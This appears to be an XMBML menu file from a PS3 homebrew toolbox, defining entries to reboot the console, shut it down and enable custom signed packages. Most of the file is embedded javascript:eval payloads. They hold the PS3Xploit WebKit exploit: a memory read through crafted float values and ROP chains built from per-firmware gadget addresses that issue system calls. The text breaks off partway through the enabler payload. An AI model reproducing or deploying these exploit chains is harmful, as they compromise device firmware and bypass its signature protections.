<XMBML version="1.0">

<!-- Main Items > HAN functions (online CEX 4.81 - 4.84 OFW/CFW/HFW Firmware) -->
		
	<View id="han_functions_main_offline">
		<Attributes>
			<Table key="han_reboot_hard_auto_offline">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/reboot.png</String></Pair>
				<Pair key="title"><String>Offline Hard Rebooter</String></Pair>
				<Pair key="info"><String>Restart console</String></Pair>
				<Pair key="module_name"><String>webrender_plugin</String></Pair>
				<Pair key="module_action"><String>javascript:eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,debug=!1,ps3xploit_ecdsa_key="948DA13E8CAFD5BA0E90CE434461BB327FE7E080475EAA0AD3AD4F5B6247A7FDA86DF69790196773",index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,search_size=2 * mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,mbytes=1048576,stat_size_offset=40,hr="\74hr\76",sc_sm_shutdown=0x17B,hard_reboot=0x1200,ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (") + 19,ua.indexOf(") Apple"));document.write(\047\074html\076\074head\076\074title\076PS3Xploit - Offline Hard Rebooter by lmn7\074/title\076\074/head\076\074body id="bodyId" style="background-color:#FFFFFF"\076\074div id="headerId"\076\074h1\076Hard Rebooting for CEX...\074/h1\076\074span id="hideme" style="visibility:hidden"\076\074p\076\074button id="btnROP" type="button" onclick="initROP(true);" autofocus\076Initialize\074/button\076 | Close \074input type="checkbox" id="auto_close" name="aclose" checked="checked" onclick="autoclose();"/\076\074span id="dex_txt" style="visibility:hidden"\076\074input type="checkbox" id="dex" name="DEX" disabled="" onclick="dex();"/\076\074/span\076\074/p\076\074p\076\074button id="btnTrigger" disabled="" type="button" onclick="triggerX();"\076En\074/button\076\074span id="reset" style="visibility:hidden"\076 | \074button id="btnReset" type="button" onclick="disable_trigger();"\076Reset\074/button\076\074/span\076\074/p\076\074/span\076\074div id="exploit" \076\074/div\076\074div id="trigger"\076\074/div\076\074/body\076\074/html\076\047); var toc_addr=7296344, default_vsh_pub_toc=7263660, vsh_opd_patch=617820, vsh_opd_addr=7256944, vsh_ps3xploit_key_toc=7370860, toc_entry1_addr=7185360, toc_entry2_addr=7494456, toc_entry3_addr=7185352, toc_entry4_addr=7602176, toc_entry5_addr=7255752, toc_entry6_addr=0, gadget1_addr=620036, gadget2_addr=6332644, gadget3_addr=872540, gadget4_addr=2267192, gadget5_addr=1227548, gadget6_addr=6380764, gadget7_addr=131024, gadget8_addr=131072, gadget12_addr=820812, gadget_mod1_addr=6352856, gadget_mod2_addr=80756, gadget_mod3_addr=757248, gadget_mod4a_addr=890500, gadget_mod7_addr=108204, gadget_mod8_addr=2862264; if (fwv=="4.81") { var toc_addr=7296288,default_vsh_pub_toc=7263604, vsh_ps3xploit_key_toc=7369532,toc_entry2_addr=7493128,toc_entry5_addr=7255696,gadget2_addr=6330024,gadget6_addr=6378144,gadget_mod1_addr=6350236,gadget_mod8_addr=2862260 } else if (fwv=="4.82") { var toc_addr=7296336,default_vsh_pub_toc=7263652,vsh_opd_addr=7256936,vsh_ps3xploit_key_toc=7370612,toc_entry2_addr=7494200,toc_entry5_addr=7255744,gadget2_addr=6332484,gadget6_addr=6380604,gadget_mod1_addr=6352696 } else if (fwv=="4.86") { var vsh_ps3xploit_key_toc=7371292,toc_entry2_addr=7494888 } function hexh2bin(a){return String.fromCharCode(a)}function hexw2bin(a){return String.fromCharCode(a\076\07616)+String.fromCharCode(a)}function hexdw2bin(a){return hexw2bin(0)+hexw2bin(a)}String.prototype.toHex16=function(){return(\0470000\047+this).substr(-4)};String.prototype.toAscii=function(a){var b=\047\047;var i=0;while(i\074this.length){if(a===true){b+=this.charCodeAt(i).toString(16).toHex16()}else{b+=this.charCodeAt(i).toString(16)}i+=1}return b};String.prototype.convert=function(a){if(this.length\0741){return\047\047}var b=\047\047;var c=\047\047;var i=0;var d=[];if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\04700\047}if(b.substr(b.length-3,2)!==\04700\047){b+=\0470000\047}while(i\074b.length){c=b.substr(i,4);d.push(String.fromCharCode(parseInt(c,16)));i+=4}return d.join(\047\047)};String.prototype.convertedSize=function(a){if(this.length\0741){return 0}var b=\047\047;if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\04700\047}if(b.substr(b.length-3,2)!==\04700\047){b+=\0470000\047}return b.length/2};String.prototype.replaceAt=function(a,b){return this.substr(0,a)+b+this.substr(a+b.length)};String.prototype.repeat=function(a){return new Array(a+1).join(this)};Number.prototype.noExponents=function(){var a=String(this).split(/[eE]/);if(a.length===1){return a[0]}var z=\047\047,sign=this\0740?\047-\047:\047\047,str=a[0].replace(\047.\047,\047\047),mag=Number(a[1])+1;if(mag\0740){z=sign+\0470.\047;while(mag++){z+=\0470\047}return z+str.replace(/^\-/,\047\047)}mag-=str.length;while(mag--){z+=\0470\047}return str+z};function fromIEEE754(a,b,c){var d=0;var g=[];var i;var j;var h;for(i=a.length;i;i-=1){h=a[i-1];for(j=8;j;j-=1){g.push(h%2?1:0);h=h\076\0761}}g.reverse();var k=g.join(\047\047);var l=(1\074\074(b-1))-1;var s=parseInt(k.substring(0,1),2)?-1:1;var e=parseInt(k.substring(1,1+b),2);var f=parseInt(k.substring(1+b),2);if(e===(1\074\074b)-1){d=f!==0?NaN:s*Infinity}else if(e\0760){d=s*Math.pow(2,e-l)*(1+f/Math.pow(2,c))}else if(f!==0){d=s*Math.pow(2,-(l-1))*(f/Math.pow(2,c))}else{d=s*0}return d.noExponents()}function generateIEEE754(a,b){var c=new Array((a\076\07624)&0xFF,(a\076\07616)&0xFF,(a\076\0768)&0xFF,(a)&0xFF,(b\076\07624)&0xFF,(b\076\07616)&0xFF,(b\076\0768)&0xFF,(b)&0xFF);return fromIEEE754(c,11,52)}function generateExploit(a,b){var n=(a\074\07432)|((b\076\0761)-1);return generateIEEE754(a,(n-a))}function readMemory(a,b){if(document.getElementById(\047exploit\047)){document.getElementById(\047exploit\047).style.src="local("+generateExploit(a,b)+")"}}function checkMemory(a,b,c){if(document.getElementById(\047exploit\047)){readMemory(a,b);if(debug===true){var x=document.getElementById(\047exploit\047).style.src.substr(6,c);return x}return document.getElementById(\047exploit\047).style.src.substr(6,c)}}function trigger(a){if(document.getElementById(\047trigger\047)){document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+a.toString(16)+")")}}function rop_exit(a){var b=document.getElementById(\047auto_close\047);if(b){if(b.checked===true)window.close()}}function load_check(){if(total_loops\074max_loops){t_out=setTimeout(initROP,1000,false)}else{total_loops=0;t_out=0}}function findJsVariableOffset(a,b,c,d){readMemory(c,d);var e=document.getElementById(\047exploit\047).style.src.substr(6,d);var i=0;var t;var k;var f;var g;while(i\074(e.length*2)){if(e.charCodeAt(i/2)===b.charCodeAt(0)){f=0;for(k=0;k\074(b.length*2);k+=0x2){if(e.charCodeAt((i+k)/2)!==b.charCodeAt(k/2)){break}f+=1}if(f===b.length){g=c+i+4;for(t=0;t\074offset_array.length;t+=1){if(offset_array[t]===g){return-1}}offset_array.push(g);return g}}i+=0x10}var h=c+d;return 0}function memcpy(a,b,c){return callsub(gadget8_addr,a,b,c,0,0,0,0,0,0,0x70)}function store_word(a,b,c,d,e){if(c===null){c=gtemp_addr}if(d===null){d=gtemp_addr}if(e===null){e=gtemp_addr}return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(b)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(a-0xC74)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod7_addr)+fill_by_16bytes(0x70,dbyte41)+hexdw2bin(c)+hexdw2bin(d)+hexdw2bin(e)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function stack_frame_hookup(){return unescape("\u4141\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41)}function stack_frame_exit(){return hexdw2bin(gadget_mod8_addr)+unescape("\u2F2A")}function syscall(a,b,c,d,e,f,g,h,i,j){if(j===null){j=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(a)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(j)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function callsub(a,b,c,d,e,f,g,h,i,j,k,l,m){var n=0x20;if(m===null){m=gtemp_addr}if(l===null){l=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(j)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(l)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(a)+fill_by_16bytes(k-n,dbyte00)+hexdw2bin(m)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function fill_by_4bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/4){c+=e.repeat(2);d++}return c}function fill_by_8bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/8){c+=e.repeat(4);d++}return c}function fill_by_16bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/16){c+=e.repeat(8);d++}return c}function initDefaults(){offset_array=[];xtra_data_addr=0;stack_frame_addr=0;jump_2_addr=0;jump_1_addr=0;ps3xploit_ecdsa_key_addr=0;index_key_addr=0;search_max_threshold=70*0x100000;search_base=0x80100000;search_size=2*mbytes;search_size_ext=0*mbytes;search_base_off=0*mbytes;total_loops++}function initROP(a){try{if(a===true){frame_fails=0;search_base_off=0;search_size_ext=0}if(t_out!==0){clearTimeout(t_out);t_out=0}initDefaults();xtra_data=start_x.convert()+unescape("\uFD7E");while(xtra_data_addr===0){if(search_max_threshold\074search_size){load_check();return}xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}stack_frame=stack_frame_hookup()+callsub(gadget12_addr,2,0,0,0,0,0,0,0,0,0x80)+syscall(sc_sm_shutdown,hard_reboot,0,0,0,0,0,0,0)+stack_frame_exit();while(stack_frame_addr===0){if(search_max_threshold\074search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0}load_check();return}stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(stack_frame_addr==-1)if(search_max_threshold\074search_size+search_size_ext){frame_fails++;load_check();return}search_max_threshold-=search_size+search_size_ext}jump_2=unescape("\u0102\u7EFB")+fill_by_16bytes(0x30,0x8282)+hexw2bin(stack_frame_addr)+unescape("\uFB7E");while(jump_2_addr===0){if(search_max_threshold\074search_size){load_check();return}jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(jump_2_addr==-1)if(search_max_threshold\074search_size){load_check();return}search_max_threshold-=search_size}jump_1=unescape("\u4141\u7EFA")+hexw2bin(jump_2_addr)+unescape("\uFA7E");while(jump_1_addr===0){if(search_max_threshold\074search_size){load_check();return}jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(jump_1_addr==-1)if(search_max_threshold\074search_size){load_check();return}search_max_threshold-=search_size}var b=checkMemory(stack_frame_addr-0x4,0x8000,stack_frame.length);var x=checkMemory(xtra_data_addr-0x4,0x1000,xtra_data.length);var c=checkMemory(jump_2_addr-0x4,0x1000,jump_2.length);var d=checkMemory(jump_1_addr-0x4,0x1000,jump_1.length);if((c===jump_2)&&(d===jump_1)&&(x===xtra_data)&&(b===stack_frame)){if(t_out!==0){clearTimeout(t_out)}triggerX()}else{load_check()}}catch(e){debug=true;debug=false}}function triggerX(){setTimeout(trigger,1000,jump_1_addr);setTimeout(rop_exit,2000,hr);setTimeout(window.close,2000);t_out=0;total_loops=0}initROP(true);');</String></Pair>
			</Table>
			<Table key="han_reboot_soft_auto_offline">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/reboot.png</String></Pair>
				<Pair key="title"><String>Offline Soft Rebooter</String></Pair>
				<Pair key="info"><String>Restart console</String></Pair>
				<Pair key="module_name"><String>webrender_plugin</String></Pair>
				<Pair key="module_action"><String>javascript:eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,debug=!1,ps3xploit_ecdsa_key="948DA13E8CAFD5BA0E90CE434461BB327FE7E080475EAA0AD3AD4F5B6247A7FDA86DF69790196773",index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,search_size=2 * mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,mbytes=1048576,stat_size_offset=40,hr="\74hr\76",sc_sm_shutdown=0x17B,soft_reboot=0x200,ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (") + 19,ua.indexOf(") Apple"));document.write(\047\074html\076\074head\076\074title\076PS3Xploit - Offline Soft Rebooter by lmn7\074/title\076\074/head\076\074body id="bodyId" style="background-color:#FFFFFF"\076\074div id="headerId"\076\074h1\076Soft Rebooting for CEX...\074/h1\076\074span id="hideme" style="visibility:hidden"\076\074p\076\074button id="btnROP" type="button" onclick="initROP(true);" autofocus\076Initialize\074/button\076 | Close \074input type="checkbox" id="auto_close" name="aclose" checked="checked" onclick="autoclose();"/\076\074span id="dex_txt" style="visibility:hidden"\076\074input type="checkbox" id="dex" name="DEX" disabled="" onclick="dex();"/\076\074/span\076\074/p\076\074p\076\074button id="btnTrigger" disabled="" type="button" onclick="triggerX();"\076En\074/button\076\074span id="reset" style="visibility:hidden"\076 | \074button id="btnReset" type="button" onclick="disable_trigger();"\076Reset\074/button\076\074/span\076\074/p\076\074/span\076\074div id="exploit" \076\074/div\076\074div id="trigger"\076\074/div\076\074/body\076\074/html\076\047); var toc_addr=7296344, default_vsh_pub_toc=7263660, vsh_opd_patch=617820, vsh_opd_addr=7256944, vsh_ps3xploit_key_toc=7370860, toc_entry1_addr=7185360, toc_entry2_addr=7494456, toc_entry3_addr=7185352, toc_entry4_addr=7602176, toc_entry5_addr=7255752, toc_entry6_addr=0, gadget1_addr=620036, gadget2_addr=6332644, gadget3_addr=872540, gadget4_addr=2267192, gadget5_addr=1227548, gadget6_addr=6380764, gadget7_addr=131024, gadget8_addr=131072, gadget12_addr=820812, gadget_mod1_addr=6352856, gadget_mod2_addr=80756, gadget_mod3_addr=757248, gadget_mod4a_addr=890500, gadget_mod7_addr=108204, gadget_mod8_addr=2862264; if (fwv=="4.81") { var toc_addr=7296288,default_vsh_pub_toc=7263604, vsh_ps3xploit_key_toc=7369532,toc_entry2_addr=7493128,toc_entry5_addr=7255696,gadget2_addr=6330024,gadget6_addr=6378144,gadget_mod1_addr=6350236,gadget_mod8_addr=2862260 } else if (fwv=="4.82") { var toc_addr=7296336,default_vsh_pub_toc=7263652,vsh_opd_addr=7256936,vsh_ps3xploit_key_toc=7370612,toc_entry2_addr=7494200,toc_entry5_addr=7255744,gadget2_addr=6332484,gadget6_addr=6380604,gadget_mod1_addr=6352696 } else if (fwv=="4.86") { var vsh_ps3xploit_key_toc=7371292,toc_entry2_addr=7494888 } function hexh2bin(a){return String.fromCharCode(a)}function hexw2bin(a){return String.fromCharCode(a\076\07616)+String.fromCharCode(a)}function hexdw2bin(a){return hexw2bin(0)+hexw2bin(a)}String.prototype.toHex16=function(){return(\0470000\047+this).substr(-4)};String.prototype.toAscii=function(a){var b=\047\047;var i=0;while(i\074this.length){if(a===true){b+=this.charCodeAt(i).toString(16).toHex16()}else{b+=this.charCodeAt(i).toString(16)}i+=1}return b};String.prototype.convert=function(a){if(this.length\0741){return\047\047}var b=\047\047;var c=\047\047;var i=0;var d=[];if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\04700\047}if(b.substr(b.length-3,2)!==\04700\047){b+=\0470000\047}while(i\074b.length){c=b.substr(i,4);d.push(String.fromCharCode(parseInt(c,16)));i+=4}return d.join(\047\047)};String.prototype.convertedSize=function(a){if(this.length\0741){return 0}var b=\047\047;if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\04700\047}if(b.substr(b.length-3,2)!==\04700\047){b+=\0470000\047}return b.length/2};String.prototype.replaceAt=function(a,b){return this.substr(0,a)+b+this.substr(a+b.length)};String.prototype.repeat=function(a){return new Array(a+1).join(this)};Number.prototype.noExponents=function(){var a=String(this).split(/[eE]/);if(a.length===1){return a[0]}var z=\047\047,sign=this\0740?\047-\047:\047\047,str=a[0].replace(\047.\047,\047\047),mag=Number(a[1])+1;if(mag\0740){z=sign+\0470.\047;while(mag++){z+=\0470\047}return z+str.replace(/^\-/,\047\047)}mag-=str.length;while(mag--){z+=\0470\047}return str+z};function fromIEEE754(a,b,c){var d=0;var g=[];var i;var j;var h;for(i=a.length;i;i-=1){h=a[i-1];for(j=8;j;j-=1){g.push(h%2?1:0);h=h\076\0761}}g.reverse();var k=g.join(\047\047);var l=(1\074\074(b-1))-1;var s=parseInt(k.substring(0,1),2)?-1:1;var e=parseInt(k.substring(1,1+b),2);var f=parseInt(k.substring(1+b),2);if(e===(1\074\074b)-1){d=f!==0?NaN:s*Infinity}else if(e\0760){d=s*Math.pow(2,e-l)*(1+f/Math.pow(2,c))}else if(f!==0){d=s*Math.pow(2,-(l-1))*(f/Math.pow(2,c))}else{d=s*0}return d.noExponents()}function generateIEEE754(a,b){var c=new Array((a\076\07624)&0xFF,(a\076\07616)&0xFF,(a\076\0768)&0xFF,(a)&0xFF,(b\076\07624)&0xFF,(b\076\07616)&0xFF,(b\076\0768)&0xFF,(b)&0xFF);return fromIEEE754(c,11,52)}function generateExploit(a,b){var n=(a\074\07432)|((b\076\0761)-1);return generateIEEE754(a,(n-a))}function readMemory(a,b){if(document.getElementById(\047exploit\047)){document.getElementById(\047exploit\047).style.src="local("+generateExploit(a,b)+")"}}function checkMemory(a,b,c){if(document.getElementById(\047exploit\047)){readMemory(a,b);if(debug===true){var x=document.getElementById(\047exploit\047).style.src.substr(6,c);return x}return document.getElementById(\047exploit\047).style.src.substr(6,c)}}function trigger(a){if(document.getElementById(\047trigger\047)){document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+a.toString(16)+")")}}function rop_exit(a){var b=document.getElementById(\047auto_close\047);if(b){if(b.checked===true)window.close()}}function load_check(){if(total_loops\074max_loops){t_out=setTimeout(initROP,1000,false)}else{total_loops=0;t_out=0}}function findJsVariableOffset(a,b,c,d){readMemory(c,d);var e=document.getElementById(\047exploit\047).style.src.substr(6,d);var i=0;var t;var k;var f;var g;while(i\074(e.length*2)){if(e.charCodeAt(i/2)===b.charCodeAt(0)){f=0;for(k=0;k\074(b.length*2);k+=0x2){if(e.charCodeAt((i+k)/2)!==b.charCodeAt(k/2)){break}f+=1}if(f===b.length){g=c+i+4;for(t=0;t\074offset_array.length;t+=1){if(offset_array[t]===g){return-1}}offset_array.push(g);return g}}i+=0x10}var h=c+d;return 0}function memcpy(a,b,c){return callsub(gadget8_addr,a,b,c,0,0,0,0,0,0,0x70)}function store_word(a,b,c,d,e){if(c===null){c=gtemp_addr}if(d===null){d=gtemp_addr}if(e===null){e=gtemp_addr}return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(b)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(a-0xC74)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod7_addr)+fill_by_16bytes(0x70,dbyte41)+hexdw2bin(c)+hexdw2bin(d)+hexdw2bin(e)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function stack_frame_hookup(){return unescape("\u4141\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41)}function stack_frame_exit(){return hexdw2bin(gadget_mod8_addr)+unescape("\u2F2A")}function syscall(a,b,c,d,e,f,g,h,i,j){if(j===null){j=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(a)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(j)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function callsub(a,b,c,d,e,f,g,h,i,j,k,l,m){var n=0x20;if(m===null){m=gtemp_addr}if(l===null){l=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(j)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(l)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(a)+fill_by_16bytes(k-n,dbyte00)+hexdw2bin(m)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function fill_by_4bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/4){c+=e.repeat(2);d++}return c}function fill_by_8bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/8){c+=e.repeat(4);d++}return c}function fill_by_16bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/16){c+=e.repeat(8);d++}return c}function initDefaults(){offset_array=[];xtra_data_addr=0;stack_frame_addr=0;jump_2_addr=0;jump_1_addr=0;ps3xploit_ecdsa_key_addr=0;index_key_addr=0;search_max_threshold=70*0x100000;search_base=0x80100000;search_size=2*mbytes;search_size_ext=0*mbytes;search_base_off=0*mbytes;total_loops++}function initROP(a){try{if(a===true){frame_fails=0;search_base_off=0;search_size_ext=0}if(t_out!==0){clearTimeout(t_out);t_out=0}initDefaults();xtra_data=start_x.convert()+unescape("\uFD7E");while(xtra_data_addr===0){if(search_max_threshold\074search_size){load_check();return}xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}stack_frame=stack_frame_hookup()+callsub(gadget12_addr,2,0,0,0,0,0,0,0,0,0x80)+syscall(sc_sm_shutdown,soft_reboot,0,0,0,0,0,0,0)+stack_frame_exit();while(stack_frame_addr===0){if(search_max_threshold\074search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0}load_check();return}stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(stack_frame_addr==-1)if(search_max_threshold\074search_size+search_size_ext){frame_fails++;load_check();return}search_max_threshold-=search_size+search_size_ext}jump_2=unescape("\u0102\u7EFB")+fill_by_16bytes(0x30,0x8282)+hexw2bin(stack_frame_addr)+unescape("\uFB7E");while(jump_2_addr===0){if(search_max_threshold\074search_size){load_check();return}jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(jump_2_addr==-1)if(search_max_threshold\074search_size){load_check();return}search_max_threshold-=search_size}jump_1=unescape("\u4141\u7EFA")+hexw2bin(jump_2_addr)+unescape("\uFA7E");while(jump_1_addr===0){if(search_max_threshold\074search_size){load_check();return}jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(jump_1_addr==-1)if(search_max_threshold\074search_size){load_check();return}search_max_threshold-=search_size}var b=checkMemory(stack_frame_addr-0x4,0x8000,stack_frame.length);var x=checkMemory(xtra_data_addr-0x4,0x1000,xtra_data.length);var c=checkMemory(jump_2_addr-0x4,0x1000,jump_2.length);var d=checkMemory(jump_1_addr-0x4,0x1000,jump_1.length);if((c===jump_2)&&(d===jump_1)&&(x===xtra_data)&&(b===stack_frame)){if(t_out!==0){clearTimeout(t_out)}triggerX()}else{load_check()}}catch(e){debug=true;debug=false}}function triggerX(){setTimeout(trigger,1000,jump_1_addr);setTimeout(rop_exit,2000,hr);setTimeout(window.close,2000);t_out=0;total_loops=0}initROP(true);');</String></Pair>
			</Table>
			<Table key="han_shutdown_auto">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/shutdown.png</String></Pair>
				<Pair key="title"><String>Shutdown</String></Pair>
				<Pair key="info"><String>Turn off console</String></Pair>
				<Pair key="module_name"><String>poweroff_plugin</String></Pair>
				<Pair key="module_action"><String></String></Pair>
			</Table>
			<Table key="han_enabler_auto_offline">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/han_enable.png</String></Pair>
				<Pair key="title"><String>Offline HAN Enabler</String></Pair>
				<Pair key="info"><String>Enable custom signed packages and licenses</String></Pair>
				<Pair key="module_name"><String>webrender_plugin</String></Pair>
				<Pair key="module_action"><String>javascript:eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,debug=!1,ps3xploit_ecdsa_key="948DA13E8CAFD5BA0E90CE434461BB327FE7E080475EAA0AD3AD4F5B6247A7FDA86DF69790196773",index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,search_size=2*mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,mbytes=1048576,stat_size_offset=40,toc_addr=7296336,default_vsh_pub_toc=7263652,vsh_opd_patch=617820,vsh_opd_addr=7256936,vsh_ps3xploit_key_toc=7370612,toc_entry1_addr=7185360,toc_entry2_addr=7494200,toc_entry3_addr=7185352,toc_entry4_addr=7602176,toc_entry5_addr=7255744,toc_entry6_addr=0,gadget1_addr=620036,gadget2_addr=6332484,gadget3_addr=872540,gadget4_addr=2267192,gadget5_addr=1227548,gadget6_addr=6380604,gadget7_addr=131024,gadget8_addr=131072,gadget_mod1_addr=6352696,gadget_mod2_addr=80756,gadget_mod3_addr=757248,gadget_mod4a_addr=890500,gadget_mod7_addr=108204,gadget_mod8_addr=2862264,hr="\74hr\76",ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 